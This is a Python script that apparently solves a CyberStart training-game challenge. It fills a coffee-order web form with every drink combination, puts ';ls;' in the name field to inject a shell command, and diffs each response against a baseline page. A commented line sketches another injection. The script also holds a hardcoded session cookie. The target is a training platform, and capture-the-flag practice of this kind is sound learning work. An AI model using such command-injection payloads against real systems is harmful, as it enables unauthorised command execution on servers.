#!/usr/bin/env python3
import requests
import sys
from tqdm import tqdm

session = requests.Session()


response = session.get(
    "https://game.joincyberstart.com/base-headquarters",
    cookies={"Cyber_Protection_Agency": "0vu34oap0bukiokhl5p4dr1orc"},
)

import re
with open('out.txt') as f:
    web_contents = f.read()
print(web_contents)

def run(type, size, shots, name):
    # print(command)
    challenge_url = f"https://game.joincyberstart.com/challenge?base=1&level=12&challenge=2&csrf={csrf_base}"

    response3 = session.post(
        challenge_url,
        cookies={"Cyber_Protection_Agency": "0vu34oap0bukiokhl5p4dr1orc"},
        data={
"drink-type": type,
"drink-size": size,
"drink-shots": shots,
"drink-name": name,

        },
    )

    remove_changing = re.sub(r'<script type="text/javascript">window.NREUM.*?</script>', '', response3.text)
    if remove_changing == web_contents:
        print('The same')
    else:
        print('Not the same')
        split_old = set(web_contents.split("\n"))
        split_new = set(remove_changing.split("\n"))
        diff = split_new.symmetric_difference(split_old)
        print(diff)

matches = re.search(r'csrf=(.*?)"', response.text)
csrf_base = matches.group(1)

drink_types = ['Cappuccino', 'Long Black', 'Flat White', 'Latte']
drink_sizes = ['Super', 'Large', 'Medium', 'Small']
drink_shots = ['One', 'Two', 'Three', 'Four']
drink_name = ';ls;'
for t in drink_types:
    for s in drink_sizes:
        for sh in drink_shots:
            print(t,s,sh,drink_name)
            run(t, s, sh, drink_name)

# run("cryptonite -n;" + command)
# print(response3.text)
